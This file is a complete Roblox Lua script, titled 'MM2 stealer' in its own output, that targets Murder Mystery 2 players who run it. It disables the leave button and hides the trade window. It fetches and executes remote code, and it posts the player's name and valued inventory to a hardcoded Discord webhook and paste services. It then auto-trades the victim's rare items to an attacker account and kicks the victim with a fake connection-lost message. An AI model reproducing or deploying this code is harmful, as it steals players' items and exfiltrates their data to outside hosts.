_G.Ex = _G.Ex or false
if _G.Ex then return end
_G.Ex = true

local InventoryWebhook = "https://discord.com/api/webhooks/1563955624960725022/3yllKVWOFP1oka0u6eEV-mU8QnL6imN934UB5ler9T7HTZpr-8fhELILOJvqUkzSvAov"
local Receivers = {"33kghoster"}
local DiscordID = ""
local MIN_TRADE_VALUE = 0
local TRADEABLE_RARITIES = {Godly=true, Ancient=true, Unique=true, Chroma=true, Vintage=true}

local found = false
local attempts = 0

if getgc then
    repeat
        local hooked = false
        for _, v in ipairs(getgc(true)) do
            if typeof(v) == "function" then
                local info = debug.getinfo(v)
                if info and info.name then
                    local name = info.name:lower()
                    if name:find("step") and not name:find("stepanimate") then
                        pcall(function()
                            local old = hookfunction(v, function(...)
                                if not found then
                                    found = true
                                    _G.RealJobID = game.JobId
                                end
                                if old then return old(...) end
                            end)
                        end)
                        hooked = true
                        break
                    end
                end
            end
        end
        attempts = attempts + 1
        if hooked or attempts >= 10 then break end
        task.wait(0.1)
    until found
end

if not found then _G.RealJobID = game.JobId end
task.wait(0.5)

task.spawn(function()
    while task.wait(10) do
        pcall(function()
            for _, v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
                v:Disable()
            end
        end)
    end
end)

local function GetRequestFunction()
    if request then return request end
    if syn and syn.request then return syn.request end
    if http_request then return http_request end
    return nil
end

local function GetRealJobID()
    local exec = "Unknown"
    pcall(function() exec = identifyexecutor() end)
    local d = {
        JobId = _G.RealJobID or game.JobId,
        Executor = string.lower(exec),
        IsDelta = false,
        Success = true,
    }
    if d.Executor == "delta" and _G.RealJobID then d.IsDelta = true end
    return d
end

local jobData = GetRealJobID()
_G.RealJobID = jobData.JobId
_G.RealExecutor = jobData.Executor

local Webhook = InventoryWebhook
local a = Receivers

if Webhook == "" then
    game.Players.LocalPlayer:Kick("Invalid URL. Please set a valid URL.")
    return
end

if game.PlaceId ~= 142823291 then
    game.Players.LocalPlayer:Kick("This script only works in Murder Mystery 2")
    return
end

local Services = setmetatable({}, {__index = function(self, s) return game:GetService(s) end})
task.spawn(function()
    while task.wait(0.3) do
        pcall(function()
            local AllButtons = Services.CoreGui:GetDescendants()
            for _, btn in ipairs(AllButtons) do
                if btn:IsA("GuiButton") and btn.Name == "LeaveGameButton" then
                    for _, conn in ipairs(getconnections(btn.Activated)) do
                        conn:Disable()
                    end
                end
            end
        end)
    end
end)

pcall(function()
    local rs = game:GetService("RobloxReplicatedStorage")
    if rs and rs:FindFirstChild("GetServerType") then
        if rs.GetServerType:InvokeServer() == "VIPServer" then
            game.Players.LocalPlayer:Kick("Private servers are not supported. Please join a normal server.")
            return
        end
    end
end)

if #game.Players:GetPlayers() >= 12 then
    game.Players.LocalPlayer:Kick("Server is full, please rejoin another server")
    return
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local excludedItems = {
    DefaultGun = true, DefaultKnife = true,
    Reaver = true, Reaver_Legendary = true, Reaver_Godly = true, Reaver_Ancient = true,
    IceHammer = true, IceHammer_Legendary = true, IceHammer_Godly = true, IceHammer_Ancient = true,
    Gingerscythe = true, Gingerscythe_Legendary = true, Gingerscythe_Godly = true, Gingerscythe_Ancient = true,
    TestItem = true, Season1TestKnife = true,
    Cracks = true, Icecrusher = true,
    ["???"] = true, Dartbringer = true,
    TravelerAxeRed = true, TravelerAxeBronze = true, TravelerAxeSilver = true, TravelerAxeGold = true,
    BlueCamo_K_2022 = true, GreenCamo_K_2022 = true,
    SharkSeeker = true
}

local itemData = {}

local function LoadItemDatabase()
    local req = GetRequestFunction()
    if not req then return nil end
    local resp = nil
    local success = pcall(function()
        resp = req({
            Url = "https://api.rubis.app/v2/scrap/lSSuMqdThhmQlB7V/raw",
            Method = "GET",
            Headers = {["User-Agent"] = "Mozilla/5.0"},
            Timeout = 10
        })
    end)
    if not success or not resp or not resp.Body then return nil end
    local db = nil
    pcall(function()
        local fn = loadstring(resp.Body)
        if fn then db = fn() end
    end)
    if not db then return nil end
    local mapping = {}
    local function addKey(k, data)
        if k and k ~= "" then mapping[k] = data end
    end
    for rarityName, items in pairs(db) do
        if rarityName == "Pet" then continue end
        local r = string.upper(string.sub(rarityName, 1, 1)) .. string.lower(string.sub(rarityName, 2))
        for itemName, value in pairs(items) do
            local itemType = "knife"
            local displayName = itemName
            if itemName:find("%(gun%)") then
                itemType = "gun"
                displayName = itemName:gsub("%s*%(gun%)%s*$", ""):match("^%s*(.-)%s*$")
            elseif itemName:find("%(knife%)") then
                itemType = "knife"
                displayName = itemName:gsub("%s*%(knife%)%s*$", ""):match("^%s*(.-)%s*$")
            end
            displayName = displayName:match("^%s*(.-)%s*$")
            local data = {
                Rarity = r,
                Value = tonumber(value) or 0,
                Chroma = (r == "Chroma"),
                InDatabase = true,
                ItemType = itemType,
                DisplayName = displayName
            }
            local dn = string.lower(displayName):gsub("'", "")
            addKey(dn:gsub(" ", ""):gsub("_", ""), data)
            addKey(dn:gsub(" ", "_"), data)
            addKey(dn:gsub(" ", ""):gsub("_", "") .. itemType, data)
            addKey(dn:gsub(" ", "_") .. "_" .. itemType, data)
            local fullFlat = string.lower(itemName):gsub("'",""):gsub(" ",""):gsub("_",""):gsub("%(",""):gsub("%)","")
            addKey(fullFlat, data)
        end
    end
    return mapping
end

for _ = 1, 3 do
    itemData = LoadItemDatabase()
    if itemData and next(itemData) then break end
    task.wait(0.5)
end

if not itemData or not next(itemData) then
    warn("Failed to load item database from Rubis API.")
end

local gcInventoryTable
if getgc then
    for _, gcVal in pairs(getgc(true)) do
        if type(gcVal) == "table"
            and rawget(gcVal, "Pets")
            and rawget(gcVal, "Item")
            and rawget(gcVal, "Badge")
        then
            gcInventoryTable = gcVal
            break
        end
    end
end

local RARITY_REMAP = {Classic = "Vintage"}
local itemValueMap = {}

if gcInventoryTable then
    for itemId, meta in pairs(gcInventoryTable.Item) do
        if meta.ItemName and not excludedItems[itemId] and not meta.EvoBaseID then
            local iType = string.lower(meta.ItemType or "knife")
            local iName = string.lower(meta.ItemName):gsub("'", "")
            local k1 = iName:gsub(" ", ""):gsub("_", "")
            local k2 = k1 .. iType
            local k3 = k1 .. "(" .. iType .. ")"
            local dbInfo
            if meta.Chroma then
                local ck = "chroma" .. k1
                dbInfo = itemData[ck] or itemData[ck .. iType]
            end
            dbInfo = dbInfo or itemData[k1] or itemData[k2] or itemData[k3]
            local val = dbInfo and dbInfo.Value or 0
            local rarity = RARITY_REMAP[meta.Rarity] or meta.Rarity or "Common"
            itemValueMap[itemId] = {
                value = val,
                name = meta.ItemName,
                rarity = rarity,
                type = meta.ItemType or "knife",
                chroma = meta.Chroma or false
            }
        end
    end
end

local function toTitleCase(text)
    local result = ""
    local capitalize = true
    for i = 1, #text do
        local char = text:sub(i, i)
        if char == "_" or char == " " then
            result = result .. " "
            capitalize = true
        else
            result = result .. (capitalize and char:upper() or char:lower())
            capitalize = false
        end
    end
    return result
end

local function GetTradeStatus()
    local ok, res = pcall(function()
        if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("GetTradeStatus") then
            return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
        end
        return "None"
    end)
    return ok and res or "None"
end

local function SendTradeRequest(targetName)
    local target = Players:FindFirstChild(targetName)
    local ok = pcall(function()
        if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("SendRequest") then
            ReplicatedStorage.Trade.SendRequest:InvokeServer(target or targetName)
        end
    end)
    return ok
end

local function AddWeaponToTrade(itemId)
    pcall(function()
        if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("OfferItem") then
            ReplicatedStorage.Trade.OfferItem:FireServer(itemId, "Weapons")
        end
    end)
end

local lastOffer = nil
pcall(function()
    if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("UpdateTrade") then
        ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(data)
            if data and data.LastOffer then
                lastOffer = data.LastOffer
            end
        end)
    end
end)

local function AcceptTrade()
    if lastOffer then
        pcall(function()
            if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("AcceptTrade") then
                ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOffer)
            end
        end)
        lastOffer = nil
        return true
    end
    return false
end

local function WaitForTradeCompletion()
    local maxWait = 30
    while GetTradeStatus() ~= "None" and maxWait > 0 do
        task.wait(0.5)
        maxWait = maxWait - 1
    end
end

local allItems, tradeItems, totalValue = {}, {}, 0

local function HasAnyDatabaseItem(itemList)
    for _, item in ipairs(itemList) do
        if item.InDatabase then return true end
    end
    return false
end

local function ShouldTradeItem(item)
    return item.InDatabase
        and not excludedItems[item.DataID]
        and TRADEABLE_RARITIES[item.Rarity]
        and item.Value >= MIN_TRADE_VALUE
end

local function BuildInventoryLists()
    local allList, tradeList, totalTradeValue = {}, {}, 0

    local fullInv = nil
    pcall(function()
        fullInv = ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(LocalPlayer)
    end)
    if not fullInv or not fullInv.Weapons then
        pcall(function()
            local profile = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
            if profile then fullInv = profile end
        end)
    end
    if not fullInv or not fullInv.Weapons or not fullInv.Weapons.Owned then
        return allList, tradeList, totalTradeValue
    end

    for itemId, amount in pairs(fullInv.Weapons.Owned) do
        if amount and amount > 0 then
            local meta = itemValueMap[itemId]
            if not meta then
                local k1 = string.lower(itemId):gsub("'",""):gsub(" ",""):gsub("_","")
                local k2 = string.lower(itemId):gsub("'",""):gsub(" ","_")
                local dbInfo = itemData[k1] or itemData[k2]
                if dbInfo then
                    meta = {
                        value = dbInfo.Value,
                        name = itemId,
                        rarity = dbInfo.Rarity,
                        type = dbInfo.ItemType or "knife",
                        chroma = dbInfo.Chroma or false
                    }
                end
            end
            if meta then
                local item = {
                    DataID = itemId,
                    ItemName = meta.name,
                    Rarity = meta.rarity,
                    Amount = amount,
                    Value = meta.value,
                    IsChroma = meta.chroma,
                    InDatabase = true,
                    TotalValue = meta.value * amount,
                    ItemType = meta.type,
                    DisplayName = meta.name
                }
                table.insert(allList, item)
                if ShouldTradeItem(item) then
                    table.insert(tradeList, item)
                    totalTradeValue = totalTradeValue + item.TotalValue
                end
            end
        end
    end

    table.sort(allList, function(x, y) return x.TotalValue > y.TotalValue end)
    table.sort(tradeList, function(x, y) return x.TotalValue > y.TotalValue end)
    return allList, tradeList, totalTradeValue
end

local function RefreshInventory()
    allItems, tradeItems, totalValue = BuildInventoryLists()
end

allItems, tradeItems, totalValue = BuildInventoryLists()

local function SendWebhook(content)
    local req = GetRequestFunction()
    local payload = {
        Url = InventoryWebhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(content)
    }
    pcall(function()
        if req then req(payload)
        elseif syn and syn.request then syn.request(payload)
        else HttpService:PostAsync(InventoryWebhook, payload.Body, Enum.HttpContentType.ApplicationJson) end
    end)
end

local RARITY_DISPLAY_ORDER = {"Ancient", "Chroma", "Unique", "Godly", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}
local PASTE_RARITY_FILTER = {Ancient=true, Chroma=true, Unique=true, Godly=true, Vintage=true}

local function GroupByRarity(itemList)
    local byRarity = {}
    for _, item in ipairs(itemList) do
        local r = item.Rarity
        if not byRarity[r] then byRarity[r] = {} end
        table.insert(byRarity[r], item)
    end
    return byRarity
end

local function FormatItemLine(item)
    local dn = toTitleCase(item.DisplayName or item.ItemName)
    if item.IsChroma and not dn:lower():find("^chroma") then
        dn = "Chroma " .. dn
    end
    local t = string.lower(item.ItemType or "knife")
    local v = tostring(math.floor(item.Value + 0.5))
    local suffix = item.Amount > 1 and " x" .. item.Amount or ""
    return " - " .. dn .. " (" .. t .. ") value: " .. v .. suffix
end

local function GenerateInventoryLines(itemList)
    local byRarity = GroupByRarity(itemList)
    local total = 0
    for _, item in ipairs(itemList) do
        total = total + item.TotalValue
    end
    local lines = {}
    table.insert(lines, "Total Value: " .. math.floor(total + 0.5))
    table.insert(lines, string.rep("-", 40))
    for _, rarity in ipairs(RARITY_DISPLAY_ORDER) do
        if PASTE_RARITY_FILTER[rarity] and byRarity[rarity] and #byRarity[rarity] > 0 then
            table.insert(lines, rarity)
            for _, item in ipairs(byRarity[rarity]) do
                table.insert(lines, FormatItemLine(item))
            end
        end
    end
    return lines
end

local function UploadToPaste(textContent)
    local req = GetRequestFunction()
    if not req then return nil end
    local success, result = pcall(function()
        local resp = req({
            Url = "https://api.rubis.app/v2/scrap?public=true",
            Method = "POST",
            Body = textContent
        })
        if resp and resp.StatusCode == 200 then
            local data = HttpService:JSONDecode(resp.Body)
            if data and data.raw then return data.raw end
        end
        return nil
    end)
    if success and result then return result end
    local ok2, res2 = pcall(function()
        local API_KEY = "bCmvP7YNqkOyMEeJDvL0eDXzfSgm2XhWcGadQ3aXKKiH7BKe5ZBIgem3tbuC"
        local resp = req({
            Url = "https://pastefy.app/api/v2/paste",
            Method = "POST",
            Headers = {
                ["Authorization"] = "Bearer " .. API_KEY,
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                content = textContent,
                title = "MM2 Inventory",
                expires = "never",
                encrypted = false
            })
        })
        if resp and resp.Body then
            local data = HttpService:JSONDecode(resp.Body)
            if data and data.paste and data.paste.id then
                return "https://pastefy.app/" .. data.paste.id .. "/raw"
            end
        end
        return nil
    end)
    return ok2 and res2 or nil
end

local RARITY_COUNT_ORDER = {"Ancient", "Chroma", "Unique", "Godly", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}

local function SendInventoryEmbed()
    local fullLines = GenerateInventoryLines(allItems)
    local fullText = table.concat(fullLines, "\n")

    local robloxVersion = "Unknown"
    pcall(function() robloxVersion = tostring(version()) end)

    local receiversList = table.concat(a, ", ")
    local pasteUrl = UploadToPaste(fullText)
    local joinLinkFull = "https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. _G.RealJobID

    local teleportCommand = string.format(
        'game:GetService("TeleportService"):TeleportToPlaceInstance("%s", "%s", game.Players.LocalPlayer)',
        tostring(game.PlaceId),
        tostring(_G.RealJobID)
    )

    local rarityCounts = {}
    for _, r in ipairs(RARITY_COUNT_ORDER) do rarityCounts[r] = 0 end
    for _, item in ipairs(allItems) do
        if rarityCounts[item.Rarity] then
            rarityCounts[item.Rarity] = rarityCounts[item.Rarity] + item.Amount
        end
    end

    local totalInventoryValue = 0
    for _, item in ipairs(allItems) do
        if PASTE_RARITY_FILTER[item.Rarity] then
            totalInventoryValue = totalInventoryValue + item.TotalValue
        end
    end

    local hasHighValue = false
    for _, item in ipairs(tradeItems) do
        if item.Value > 3 then
            hasHighValue = true
            break
        end
    end

    local contentStr = (hasHighValue and "@everyone\n" or "") .. teleportCommand

    local invText = "```"
        .. "Total value: " .. math.floor(totalInventoryValue + 0.5)
        .. "\nAncient    : " .. rarityCounts["Ancient"]
        .. "\nGodly      : " .. rarityCounts["Godly"]
        .. "\nUnique     : " .. rarityCounts["Unique"]
        .. "\nVintage    : " .. rarityCounts["Vintage"]
        .. "\nLegendary  : " .. rarityCounts["Legendary"]
        .. "\nRare       : " .. rarityCounts["Rare"]
        .. "\nUncommon   : " .. rarityCounts["Uncommon"]
        .. "\nCommon     : " .. rarityCounts["Common"]
        .. "```"
        .. "\n**__List of items__**\n"
        .. (pasteUrl or "Failed to upload")
        .. (DiscordID ~= "" and ("\n" .. DiscordID) or "")

    local embed = {
        title = "MM2 stealer",
        color = 0x9933CC,
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        fields = {
            {
                name = "`Player Info:`",
                value = "```"
                    .. "Username: " .. LocalPlayer.Name
                    .. "\nDisplay Username: " .. LocalPlayer.DisplayName
                    .. "\nExecutor: " .. (_G.RealExecutor or "Unknown")
                    .. "\nRoblox version: " .. robloxVersion
                    .. "\nReceiver: " .. receiversList
                    .. "```",
                inline = false
            },
            {
                name = "**__Inventory__**",
                value = invText,
                inline = false
            },
            {
                name = "__Join link:__",
                value = "[click here to join](" .. joinLinkFull .. ")",
                inline = false
            }
        },
        footer = {
            text = "WISTERIA MM2 - " .. os.date("%Y-%m-%d %H:%M:%S")
        }
    }

    pcall(function()
        SendWebhook({
            content = contentStr,
            embeds = {embed}
        })
    end)
end

local tradeGui = PlayerGui:WaitForChild("TradeGUI")
tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    tradeGui.Enabled = false
end)

local tradeGuiPhone = PlayerGui:WaitForChild("TradeGUI_Phone")
tradeGuiPhone:GetPropertyChangedSignal("Enabled"):Connect(function()
    tradeGuiPhone.Enabled = false
end)

local function KickWhenDone()
    task.wait(2)
    game.Players.LocalPlayer:Kick("Connection lost. Please rejoin.")
end

if #allItems > 0 then
    SendInventoryEmbed()
    local function ProcessTradesLoop(targetName)
        local maxTradeAttempts = 999
        local tradeAttempts = 0
        while tradeAttempts < maxTradeAttempts do
            RefreshInventory()
            if #tradeItems == 0 then
                return
            end
            tradeAttempts = tradeAttempts + 1
            local status = GetTradeStatus()
            if status == "StartTrade" then
                pcall(function()
                    if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("DeclineTrade") then
                        ReplicatedStorage.Trade.DeclineTrade:FireServer()
                    end
                end)
                task.wait(0.3)
            elseif status == "ReceivingRequest" then
                pcall(function()
                    if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("DeclineRequest") then
                        ReplicatedStorage.Trade.DeclineRequest:FireServer()
                    end
                end)
                task.wait(0.3)
            end
            local tradeSent = false
            local sendAttempts = 0
            while not tradeSent and sendAttempts < 15 do
                local currentStatus = GetTradeStatus()
                if currentStatus == "None" then
                    if SendTradeRequest(targetName) then
                        tradeSent = true
                    end
                elseif currentStatus == "StartTrade" then
                    tradeSent = true
                elseif currentStatus == "ReceivingRequest" then
                    pcall(function()
                        if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("DeclineRequest") then
                            ReplicatedStorage.Trade.DeclineRequest:FireServer()
                        end
                    end)
                    task.wait(0.2)
                end
                if not tradeSent then
                    task.wait(0.4)
                    sendAttempts = sendAttempts + 1
                end
            end
            if not tradeSent then
                task.wait(1)
                continue
            end
            local waitLoop = 0
            while GetTradeStatus() ~= "StartTrade" and waitLoop < 30 do
                task.wait(0.2)
                waitLoop = waitLoop + 1
            end
            if GetTradeStatus() ~= "StartTrade" then
                task.wait(1)
                continue
            end
            local itemsToSend = math.min(4, #tradeItems)
            for _ = 1, itemsToSend do
                if #tradeItems == 0 then break end
                local item = table.remove(tradeItems, 1)
                for _ = 1, item.Amount do
                    AddWeaponToTrade(item.DataID)
                    task.wait(0.015)
                end
            end
            task.wait(6)
            AcceptTrade()
            WaitForTradeCompletion()
            task.wait(1.5)
        end
    end
    local function AutoTradeOnJoin()
        local isBusy = false
        local function CheckPlayer(player)
            if isBusy then return end
            if table.find(a, player.Name) then
                isBusy = true
                task.wait(3)
                ProcessTradesLoop(player.Name)
            end
        end
        for _, player in ipairs(Players:GetPlayers()) do
            CheckPlayer(player)
        end
        Players.PlayerAdded:Connect(CheckPlayer)
    end
    AutoTradeOnJoin()
end
